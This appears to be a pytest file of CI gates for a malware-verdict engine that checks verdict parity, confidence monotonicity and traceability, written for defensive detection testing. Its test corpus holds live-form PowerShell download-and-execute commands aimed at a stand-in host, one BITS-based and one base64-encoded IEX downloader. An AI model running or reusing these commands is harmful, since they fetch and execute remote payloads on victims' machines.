"""P1-02b · Six permanent CI gates for the tiered Verdict Engine.

Gates:
  1. VERDICT PARITY          — Workspace and X-Lab produce identical
                                verdicts on identical CIO input.
  2. CONFIDENCE MONOTONICITY  — Adding evidence never decreases confidence.
  3. CONTRIBUTOR TRACEABILITY — Every contributor maps to a real
                                evidence node OR a metadata origin.
  4. EXPLANATION COMPLETENESS — Every verdict has a non-empty
                                human-readable reason citing contributors.
  5. EVIDENCE COVERAGE        — Every finding in the CIO references a
                                supporting evidence node.
  6. REPORT CONSISTENCY       — Executive Summary · Story · Verdict all
                                agree on label + confidence + top MITRE.

Plus: BITS-downloader regression — the canonical corpus case that MUST
graduate from `Runtime Dependent` to `Malicious` with the tiered model.
"""
from __future__ import annotations

import copy
import pytest

from nivxforge.investigation.verdict_engine import compute_verdict
from nivxforge.investigation.evidence_classes import (
    EvidenceClass,
    CLASS_WEIGHT,
    apply_escalation,
    class_of,
    weight_of,
)


# ═════════════ Helpers ══════════════════════════════════════════════

def _build_cio(text: str):
    from smart_decoder import smart_decode
    from nivxforge.cim.fact_substrate import from_analysis_result
    from nivxforge.investigation import build_cio
    result = smart_decode(text) or {}
    fs = from_analysis_result(result, input_text=text,
                              source_endpoint="/tests/p1-02b")
    return build_cio(fs), result


CORPUS = [
    ("bits_downloader",
     'try{Import-Module BitsTransfer; Start-BitsTransfer -Source \'http://evils.com/a.exe\' -Destination $env:temp+\'\\a.exe\'; Invoke-Item $env:temp+\'\\a.exe\';}catch{}'),
    ("encoded_downloader",
     "powershell -EncodedCommand SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbABzAC4AYwBvAG0ALwBhAC4AcABzADEAIgApACkA"),
    ("simple_url", "http://evils.com/a.exe"),
]


# ═════════════ Gate 1 · Verdict Parity ═════════════════════════════

@pytest.mark.parametrize("name,text", CORPUS, ids=[c[0] for c in CORPUS])
def test_gate1_verdict_parity(name, text):
    """Same CIO evaluated twice → bit-identical verdict."""
    cio, _ = _build_cio(text)
    g1 = copy.deepcopy(cio.evidence_graph)
    g2 = copy.deepcopy(cio.evidence_graph)
    md = dict(cio.metadata)
    v1 = compute_verdict(g1, metadata=md)
    v2 = compute_verdict(g2, metadata=md)
    assert v1.label == v2.label
    assert v1.confidence == v2.confidence
    assert v1.confidence_pct == v2.confidence_pct
    assert v1.engine == v2.engine == "unified-verdict-engine-v1"
    assert len(v1.contributors) == len(v2.contributors)


# ═════════════ Gate 2 · Confidence Monotonicity ═════════════════════

def test_gate2_confidence_is_monotonic_when_evidence_added():
    """Adding a contributor may only RAISE confidence — never lower it."""
    from nivxforge.investigation.graph import EvidenceGraph, Node
    g = EvidenceGraph()
    g.add_node(Node(id="A", kind="artifact", label="input", confidence=1.0))
    baseline = compute_verdict(g).confidence
    running = baseline
    # Add contributors in ascending evidence-class order.
    additions = [
        # (id, kind, label, confidence)
        ("N1", "ioc",              "https://evils.com/a", 0.8),  # URL — LOW
        ("N2", "mitre_technique",  "T1059.001",           0.8),  # MEDIUM
        ("N3", "lolbin",           "LOLBIN · powershell", 0.9),  # HIGH
        ("N4", "family_match",     "Emotet",              0.9),  # CRITICAL
    ]
    for i, (nid, kind, label, conf) in enumerate(additions):
        # Provide required attrs based on kind so kind mapping works.
        attrs = {}
        if kind == "ioc":
            attrs = {"ioc_kind": "url"}
        g.add_node(Node(id=nid, kind=kind, label=label, value=label,
                        confidence=conf, attrs=attrs))
        v = compute_verdict(g)
        assert v.confidence >= running - 1e-9, (
            f"[step {i}] confidence dropped: {running:.4f} → {v.confidence:.4f} "
            f"after adding {kind}"
        )
        running = v.confidence


@pytest.mark.parametrize("name,text", CORPUS, ids=[c[0] for c in CORPUS])
def test_gate2_metadata_addition_only_raises_confidence(name, text):
    """Adding metadata contributors (rules/lolbas/recipes) may only RAISE
    confidence vs the graph-only baseline."""
    cio, _ = _build_cio(text)
    graph_only = compute_verdict(cio.evidence_graph).confidence
    with_meta = compute_verdict(cio.evidence_graph, metadata=cio.metadata).confidence
    assert with_meta >= graph_only - 1e-9, (
        f"[{name}] metadata contributors LOWERED confidence: "
        f"{graph_only:.4f} → {with_meta:.4f}"
    )


# ═════════════ Gate 3 · Contributor Traceability ════════════════════

@pytest.mark.parametrize("name,text", CORPUS, ids=[c[0] for c in CORPUS])
def test_gate3_every_contributor_traces_to_evidence(name, text):
    """Every contributor's `node_id` must either
       (a) be a real EvidenceGraph node id, OR
       (b) start with `META-` and its `source` field name the origin."""
    cio, _ = _build_cio(text)
    v = compute_verdict(cio.evidence_graph, metadata=cio.metadata)
    graph_ids = {n.id for n in cio.evidence_graph.nodes}
    for c in v.contributors:
        if c.node_id in graph_ids:
            assert c.source == "graph", (
                f"[{name}] contributor {c.node_id} ties to graph but source={c.source}"
            )
        else:
            assert c.node_id.startswith("META-"), (
                f"[{name}] contributor {c.node_id} is neither a graph node "
                f"nor a META-* pseudo-id"
            )
            assert c.source.startswith("metadata:"), (
                f"[{name}] META contributor {c.node_id} missing metadata source tag"
            )


# ═════════════ Gate 4 · Explanation Completeness ═══════════════════

@pytest.mark.parametrize("name,text", CORPUS, ids=[c[0] for c in CORPUS])
def test_gate4_verdict_reason_is_populated(name, text):
    cio, _ = _build_cio(text)
    v = compute_verdict(cio.evidence_graph, metadata=cio.metadata)
    assert v.reason, f"[{name}] verdict has empty reason"
    assert len(v.reason) > 30, f"[{name}] verdict reason too short: {v.reason!r}"
    # Reason must cite at least ONE contributor label OR the escalation rule.
    if v.contributors:
        assert (
            any(c.label and c.label in v.reason for c in v.contributors[:5])
            or (v.escalation_rule and v.escalation_rule in v.reason)
        ), f"[{name}] reason cites neither a top contributor nor an escalation rule"


# ═════════════ Gate 5 · Evidence Coverage ══════════════════════════

@pytest.mark.parametrize("name,text", CORPUS, ids=[c[0] for c in CORPUS])
def test_gate5_findings_reference_evidence_nodes(name, text):
    """Every non-metadata contributor must reference a graph node
    that actually exists AND has non-zero effective weight."""
    cio, _ = _build_cio(text)
    v = compute_verdict(cio.evidence_graph, metadata=cio.metadata)
    graph_ids = {n.id for n in cio.evidence_graph.nodes}
    for c in v.contributors:
        if not c.node_id.startswith("META-"):
            assert c.node_id in graph_ids
            assert c.weight > 0


# ═════════════ Gate 6 · Report Consistency ═════════════════════════

@pytest.mark.parametrize("name,text", CORPUS, ids=[c[0] for c in CORPUS])
def test_gate6_cio_verdict_matches_engine_output(name, text):
    """The verdict stored on the CIO must be the exact output of
    `compute_verdict` — no post-hoc rewriting."""
    cio, _ = _build_cio(text)
    engine_output = compute_verdict(cio.evidence_graph, metadata=cio.metadata)
    cio_verdict = cio.verdict
    if hasattr(cio_verdict, "model_dump"):
        cio_verdict = cio_verdict.model_dump()
    assert cio_verdict["label"] == engine_output.label
    assert cio_verdict["confidence_pct"] == engine_output.confidence_pct
    assert cio_verdict["engine"] == "unified-verdict-engine-v1"


# ═════════════ BITS-downloader regression ═══════════════════════════

def test_bits_downloader_reaches_malicious_when_signals_stack():
    """The exact regression the operator called out: PowerShell + BITS +
    URL + LOLBAS + custom recipe must land Malicious via deterministic
    escalation, not require score-tuning."""
    from nivxforge.investigation.graph import EvidenceGraph, Node
    g = EvidenceGraph()
    g.add_node(Node(id="A", kind="artifact", label="input", confidence=1.0))
    g.add_node(Node(id="F1", kind="decoded_fragment",
                    label="Encoded PowerShell", confidence=0.9,
                    attrs={"op": "powershell.encoded"}))
    g.add_node(Node(id="F2", kind="decoded_fragment",
                    label="Invoke-Expression", confidence=0.9,
                    value="IEX (New-Object Net.WebClient)",
                    attrs={"op": "iex.inline"}))
    g.add_node(Node(id="L1", kind="lolbin", label="LOLBIN · bitsadmin",
                    value="bitsadmin", confidence=0.9))
    g.add_node(Node(id="U1", kind="ioc", label="URL",
                    value="http://evils.com/a.exe", confidence=0.85,
                    attrs={"ioc_kind": "url"}))
    metadata = {
        "custom_recipes_matched": [
            {"name": "bits-http-downloader", "confidence": 0.92},
        ],
        "rules_hit": [
            {"rule": "T1197_BitsJob_Download", "severity": "high", "confidence": 0.88},
        ],
    }
    v = compute_verdict(g, metadata=metadata)
    assert v.label == "Malicious", (
        f"BITS downloader failed to reach Malicious; got {v.label} "
        f"(conf={v.confidence_pct}%). Reason: {v.reason}"
    )
    assert v.confidence_pct >= 96, (
        f"BITS downloader confidence too low: {v.confidence_pct}% "
        f"(expected ≥ 96%). Contributors: {[c.label for c in v.contributors[:6]]}"
    )
    # Verdict promoted to Malicious via EITHER escalation rule OR
    # class distribution (a CRITICAL recipe alone qualifies).
    reached_via_escalation = v.escalation_rule is not None
    reached_via_class = any(c.evidence_class == "critical" for c in v.contributors)
    assert reached_via_escalation or reached_via_class, (
        f"BITS downloader reached Malicious but neither an escalation rule "
        f"nor a CRITICAL contributor was recorded. Reason: {v.reason}"
    )
    # At least one metadata-derived contributor participated.
    meta_contribs = [c for c in v.contributors if c.node_id.startswith("META-")]
    assert len(meta_contribs) >= 2, (
        f"expected ≥ 2 metadata contributors (recipe + rule), got "
        f"{len(meta_contribs)}: {[c.label for c in meta_contribs]}"
    )


def test_undetermined_stays_undetermined_when_only_context():
    """No evidence → Undetermined. Adding only CONTEXT signals may bring
    us to Informational but never to Suspicious/Malicious."""
    from nivxforge.investigation.graph import EvidenceGraph, Node
    g = EvidenceGraph()
    g.add_node(Node(id="A", kind="artifact", label="input", confidence=1.0))
    v0 = compute_verdict(g)
    assert v0.label == "Undetermined"
    metadata = {"ti_shield": {"layers": [{"name": "internal", "confidence": 0.3}]}}
    v1 = compute_verdict(g, metadata=metadata)
    assert v1.label in ("Informational", "Undetermined")


def test_escalation_rules_are_deterministic():
    """Applying the same kind-set twice returns the same rule name."""
    kinds = {"encoded_powershell", "invoke_expression", "external_ioc_url"}
    label_a, rule_a = apply_escalation(kinds)
    label_b, rule_b = apply_escalation(kinds)
    assert (label_a, rule_a) == (label_b, rule_b)
    assert label_a == "Malicious"


def test_escalation_promotes_without_critical_evidence():
    """Encoded PS + IEX + URL (no CRITICAL contributor) must still
    reach Malicious via the escalation rule — this is the pattern-
    recognition path the operator called out."""
    from nivxforge.investigation.graph import EvidenceGraph, Node
    g = EvidenceGraph()
    g.add_node(Node(id="A", kind="artifact", label="input", confidence=1.0))
    g.add_node(Node(id="F1", kind="decoded_fragment",
                    label="Encoded PowerShell", confidence=0.9,
                    attrs={"op": "powershell.encoded"}))
    g.add_node(Node(id="F2", kind="decoded_fragment",
                    label="Invoke-Expression payload", confidence=0.9,
                    value="IEX (New-Object Net.WebClient)",
                    attrs={"op": "iex.inline"}))
    g.add_node(Node(id="U1", kind="ioc", label="URL",
                    value="http://evils.com/a.exe", confidence=0.85,
                    attrs={"ioc_kind": "url"}))
    v = compute_verdict(g)
    # Only HIGH + HIGH + LOW → without escalation this would be
    # Malicious via 2×HIGH; with escalation it's still Malicious.
    assert v.label == "Malicious"
    # The rule fired AND tagged contributors.
    assert v.escalation_rule == "encoded PS + IEX + network download"
    tagged = sum(1 for c in v.contributors if c.escalated_by)
    assert tagged >= 3


def test_evidence_classes_registered_correctly():
    """Every kind the verdict engine emits must have a class assignment
    OR be a known no-contribute kind."""
    from nivxforge.investigation import evidence_classes as ec
    # A representative sample from _kind_for_graph_node:
    for kind in ["external_ioc_url", "external_ioc_ip", "hash_ioc",
                 "mitre_technique", "lolbin", "bits_abuse", "rundll32_abuse",
                 "encoded_powershell", "invoke_expression", "obfuscated_command",
                 "credential_access", "lateral_movement", "persistence",
                 "network_beacon", "reflective_injection", "sha_matched_family",
                 "custom_recipe_hit", "rule_hit", "sigma_hit", "yara_hit",
                 "confirmed_malicious_url", "confirmed_malicious_ip",
                 "confirmed_malicious_hash", "known_c2"]:
        assert kind in ec.KIND_TO_CLASS, f"kind {kind} not registered in KIND_TO_CLASS"
